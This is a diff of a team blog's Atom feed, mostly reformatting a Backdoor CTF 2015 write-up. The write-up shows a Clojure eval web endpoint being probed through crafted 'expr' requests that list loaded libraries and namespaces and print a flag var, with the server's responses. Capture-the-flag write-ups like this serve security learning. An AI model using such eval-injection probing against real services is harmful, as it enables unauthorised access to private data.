@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf, | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-03T00:55:24+04:30</updated>
+  <updated>2015-04-03T01:03:54+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -18,8 +18,9 @@
     <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/"/>
     <updated>2015-04-03T00:42:36+04:30</updated>
     <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup</id>
-    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong><br/>
-<strong>Point = 200</strong><br/>
+    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong></p>
+
+<p><strong>Point = 200</strong><br/>
 <strong>Category = Exploit</strong><br/>
 <strong>Description : </strong></p>
 
@@ -43,18 +44,15 @@ Lets see whats happen if we execute our codes directly :
 <a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=*">https://agile-garden-1672.herokuapp.com/eval.json?expr=*</a>
 And the response :</p>
 
-<pre><code>{"expr":"*","result":"#&lt;core$_STAR_ clojure.core$_STAR_@5ca69ca5&gt;"}
-</code></pre>
-
-<p> cool , Its Clojure and * is built-in function in &ldquo;clojure.core&rdquo;
+<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;*&rdquo;,&ldquo;result&rdquo;:&ldquo;#&lt;core$<em>STAR</em> clojure.core$<em>STAR</em>@5ca69ca5>&rdquo;}
+ cool , Its Clojure and * is built-in function in &ldquo;clojure.core&rdquo;
  lets google clojure.core and find all functions of this library :
 <a href="http://clojure.github.io/clojure/clojure.core-api.html">http://clojure.github.io/clojure/clojure.core-api.html</a>
 this link has all built-in functions of this library . after little searching found (loaded-libs) function .
 more googling about clojure i understood that for using function out syntax shoud be like
 (function) . for loaded-libs it should be (loaded-libs) and response :</p>
 
-<pre><code>{"expr":"(loaded-libs)","result":"#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}"}
-</code></pre>
+<p>   {&ldquo;expr&rdquo;:&ldquo;(loaded-libs)&rdquo;,&ldquo;result&rdquo;:&ldquo;#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}&rdquo;}</p></blockquote>
 
 <p>Found good things :</p>
 
@@ -71,8 +69,7 @@ little googling found &ldquo;clojure.repl/dir&rdquo; it can list classes , funct
 
 <p>and response :</p>
 
-<pre><code>{"expr":"(clojure.repl/dir noname.people.admin)","result":"flag\nnil"}
-</code></pre>
+<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;(clojure.repl/dir noname.people.admin)&rdquo;,&ldquo;result&rdquo;:&ldquo;flag\nnil&rdquo;}</p></blockquote>
 
 <p>oh . &ldquo;flag&rdquo; &hellip;. lets check if its public :
 <a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29</a></p>
@@ -91,8 +88,7 @@ Ma flag is : _b7w_1_l1k3_60l4n6_700nil</p></blockquote>
 <p>We need first part of flag called admin&rsquo;s secret , let test  (noname.people.admin/secret)
 and response id error :</p>
 
-<pre><code>{"error":true,"message":"java.lang.IllegalStateException: var: noname.people.admin/secret is not public"}
-</code></pre>
+<blockquote><p>   {&ldquo;error&rdquo;:true,&ldquo;message&rdquo;:&ldquo;java.lang.IllegalStateException: var: noname.people.admin/secret is not public&rdquo;}</p></blockquote>
 
 <p>it private , and because of namespace we cant use it also we cant switch our namespace becuase &ldquo;ns&rdquo; is closed by Java.Security&hellip;</p>
 
@@ -101,7 +97,7 @@ found this <a href="http://christophermaier.name/blog/2011/04/30/not-so-private-
 
 <p>awesome :D</p>
 
-<p>do what it said : <br/>
+<p>do what it said :<br/>
 <img src="http://up.ashiyane.org/images/lqo0cppgkh89dci505u1.png" alt="enter image description here" /></p>
 
 <p>and its the first part of the flag :</p>
